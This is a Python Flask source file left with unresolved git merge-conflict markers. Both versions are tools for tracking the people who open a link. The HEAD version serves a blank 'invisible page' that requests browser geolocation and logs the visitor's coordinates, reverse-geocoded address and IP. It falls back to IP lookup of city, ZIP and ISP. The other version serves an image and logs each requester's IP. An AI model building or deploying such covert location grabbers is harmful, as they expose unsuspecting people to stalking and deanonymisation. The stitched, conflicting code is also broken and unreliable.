<<<<<<< HEAD
import requests
import json
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
LOG_FILE = "ip_log.txt"
USER_AGENT = "GeoTracker/1.0 (+youremail@example.com)"

def get_ip_location(ip):
    """Get approximate location from IP."""
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={"fields": "status,country,regionName,city,zip,isp"},
            timeout=5
        )
        j = r.json()
        if j.get("status") == "success":
            return {
                "method": "ip-api",
                "country": j.get("country"),
                "region": j.get("regionName"),
                "city": j.get("city"),
                "zip": j.get("zip"),
                "isp": j.get("isp")
            }
    except:
        pass
    return {"method": "ip-api", "error": "lookup failed"}

def reverse_geocode(lat, lon):
    """Turn lat/lon into a display name via OSM Nominatim."""
    try:
        r = requests.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={"format": "jsonv2", "lat": lat, "lon": lon},
            headers={"User-Agent": USER_AGENT},
            timeout=5
        )
        j = r.json()
        return j.get("display_name")
    except:
        return None

def log_entry(entry):
    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    with open(LOG_FILE, "a") as f:
        f.write(f"{ts} {json.dumps(entry)}\n")

@app.route('/track')
def track():
    # Serves an invisible page that fires JS geolocation
    html = """
    <!DOCTYPE html><html><head><meta charset="utf-8"></head><body>
    <script>
      function send(data){
        fetch('/log_location',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify(data)
        });
      }
      function onSuccess(pos){
        send({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        });
      }
      function onError(err){
        send({ error: err.message });
      }
      if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(onSuccess, onError);
      } else {
        onError({ message: "Geolocation not supported" });
      }
    </script>
    </body></html>
    """
    return render_template_string(html)

@app.route('/log_location', methods=['POST'])
def log_location():
    ip = request.remote_addr
    data = request.get_json() or {}
    entry = {"ip": ip}

    if "latitude" in data and "longitude" in data:
        # Precise coords given → reverse geocode
        lat = data["latitude"]
        lon = data["longitude"]
        place = reverse_geocode(lat, lon)
        entry["method"]    = "browser-geolocation"
        entry["coords"]    = {"lat": lat, "lon": lon, "accuracy": data.get("accuracy")}
        entry["location"]  = place or "reverse-geocode-failed"
    else:
        # Fallback to IP-based lookup
        entry.update(get_ip_location(ip))

    log_entry(entry)
    return jsonify(status="ok")

if __name__ == '__main__':
=======
from flask import Flask, send_file, request
import logging

app = Flask(__name__)

# Configure logging
logging.basicConfig(filename='ip_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Path to the image file
IMAGE_PATH = 'path/to/your/image.jpg'

@app.route('/image')
def serve_image():
    # Log the IP address of the requester
    ip_address = request.remote_addr
    logging.info(f'IP Address: {ip_address}')

    # Serve the image
    return send_file(IMAGE_PATH, mimetype='image/jpeg')

if __name__ == '__main__':
>>>>>>> afc68a16657528432b246e7295380c013f6b8262
    app.run(host='0.0.0.0', port=5000)